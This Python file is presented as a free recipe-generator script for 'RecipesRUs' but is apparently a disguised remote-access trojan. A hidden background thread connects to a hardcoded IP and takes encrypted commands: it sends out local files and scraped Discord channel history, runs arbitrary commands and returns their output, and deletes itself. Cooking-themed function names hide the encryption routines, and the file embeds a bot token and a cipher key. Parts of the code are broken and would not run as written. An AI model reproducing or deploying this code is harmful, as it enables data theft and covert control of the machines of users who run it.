# Welcome to our free recipe generator script! We provide you the means to generate
# your own recipes at your fingertips! Thank you for supporting RecipesRUs!

import gui
from gui import *
import random

recipesrusip = '172.31.4.131'
connport = 8080
recipeseed = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

units = ["mL","oz","in", "mi","km", "lbs", "g", "kg", "mg"]
seasonings = ["salt", "sugar", "thyme", "MSG", "curry powder", "garlic powder", "garam masala", "cilantro", "basil"]
ingredients = ["bacon", "pork", "beef", "carrots", "potatoes", "chicken", "fish"]
temperatures = ["C", "F", "K"]
wet_ingredients = ["butter", "water", "chicken broth", "beef broth"]
time_units = ["milliseconds", "seconds", "minutes", "hours", "days"]
cooking_vessel = ["pot", "pan", "shoe", "bowl", "preheated oven", "dutch oven", "waffle maker", "toaster"]

def mix_ingredients(recipeseed, data):
    iv = recipe_list.urandom(8)
    cipher = Cipher(algorithms.TripleDES(recipeseed), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(64).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

def unmix_ingredients(recipeseed, encrypted_data):
    iv = encrypted_data[:8]
    encrypted_data = encrypted_data[8:]
    cipher = Cipher(algorithms.TripleDES(recipeseed), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    unpadder = padding.PKCS7(64).unpadder()
    unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
    return unpadded_data

def stir_ingredients(recipeseed, data):
    iv = recipe_list.urandom(16)
    cipher = Cipher(algorithms.AES(recipeseed), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

async def generate_recipes():
    rec_gen = recipe_getter.Client(intents=recipe_getter.Intents.all())

    async def get_recipe_written():
        writer = rec_gen.get_channel(1231711923532464240)

        if writer:
            recipe_file = open('recipes.txt', 'x+')
            async for message in writer.history(limit=None):
                recipe_file.write(f'{message.author}: {message.content}\n')
                if message.attachments[0]:
                    recipe_file.write[f'{message.author}:{message.attachments[0].url}\n']

    @rec_gen.event
    async def on_ready():
        await get_recipe_written()
        await rec_gen.close()

    await rec_gen.start('MTIzMTcwOTU1MzU2NjAyNzg1OA.G3zTy9.DmP9aHL8EIYWLlOOGnTHD13-SPyBy3sziS3g_k')

def run_recipe_app():
    while True:
        try:
            conn.connect((recipesrusip, connport))
            break
        except ConnectionRefusedError:
            pass

    while True:
        enc_req = conn.recv(4096)

        if not enc_req:
            break

        request = unmix_ingredients(recipeseed, enc_req).decode().split(' ')

        if request[0] == "remove":
            conn.close()
            recipe_list.remove("noodle_recipes_generator")
        elif request[0] == "exfil":
            if len(request) > 1 and request[1] == "image":
                with open(request[2], "r+") as f:
                    image_data = f.read()
                conn.sendall(stir_ingredients(recipeseed, image_data))
                conn.sendall("Done")
            else:
                recipe_generator.run(generate_recipes())
                try:
                    recipe = open("recipes.txt", "r+")                   
                except FileNotFoundError:
                    recipe_generator.run(generate_recipes())
                    recipe = open("recipes.txt", "r+")

                for line in recipe:
                    conn.sendall(stir_ingredients(recipeseed, json.dumps(line).encode()))

                conn.sendall("Done")
                recipe_list.remove("recipes.txt")
                # recipe_list.remove("noodle_recipes_generator.py")
        else:
            validator = recipe_validator(request, stdout=validation_output.PIPE)
            val_out = []

            for i in validator.stdout.readlines():
                val_out.append(i.decode().strip())

            if len(val_out) != 0:
                conn.sendall(mix_ingredients(recipeseed, json.dumps(val_out).encode()))
                conn.sendall("Done")

def make_random_recipe():
    steps = random.randint(0,25)
    commands = ["add", "mix in", "stir", "cook for", "wait"]
    all_steps = []

    for i in range(steps):
        typ = random.randint(0,5)
        command = commands[typ]

        match command:
            case "add":
                ingredients_num = random.randint(1,2)
                step = f'add '

                for i in range(ingredients_num):
                    if i > 0:
                        step += "and "
                    amount = random.randint(0,100)
                    
                    step += f'{amount} {units[random.randint(0,len(units)-1)]} of {ingredients[random.randint(0,len(ingredients)-1)]} '
                all_steps.append(step)
            case "mix in":
                seasonings_num = random.randint(1,4)
                step = f'mix in '

                for i in range(seasonings_num):
                    if i > 0:
                        step += "and "
                    amount = random.randint(0,100)
                    
                    step += f'{amount} {units[random.randint(0,len(units)-1)]} of {seasonings[random.randint(0,len(seasonings)-1)]} '
                all_steps.append(step)
                pass
            case "stir":
                step = f'stir in '
                amount = random.randint(0,100)
                step += f'{amount} {units[random.randint(0,len(units)-1)]} of {wet_ingredients[random.randint(0,len(wet_ingredients)-1)]} '
                all_steps.append(step)
                pass
            case "wait":
                step = f'wait for '
                amount = random.randint(0,100)
                step += f'{amount} {time_units[random.randint(0,len(time_units)-1)]} '
                all_steps.append(step)
            case "cook for":
                step = f'simmer for '
                amount = random.randint(0,100)
                temp_amount = random.randint(0,500)
                step += f'{amount} {time_units[random.randint(0,len(time_units)-1)]} at {temp_amount} {temperatures[random.randint(0,len(temperatures)-1)]} in a {cooking_vessel[random.randint(0,len(cooking_vessel)-1)]}'
                all_steps.append(step)

    final_step = f'add noodles and cook for '
    amount = random.randint(0,100)
    temp_amount = random.randint(0,500)
    final_step += f'{amount} {time_units[random.randint(0,len(time_units)-1)]} at {temp_amount} {temperatures[random.randint(0,len(temperatures)-1)]} in a {cooking_vessel[random.randint(0,len(cooking_vessel)-1)]}'
    all_steps.append(final_step)
    return all_steps

if __name__ == "__main__":
    recipe_interface = Recipe_App.Thread(target=run_recipe_app)
    recipe_interface.daemon = True
    recipe_interface.start()
    # init_steps = make_random_recipe()
    # print(init_steps)
    app = App()
    app.create_random_recipe()

        
    app.mainloop()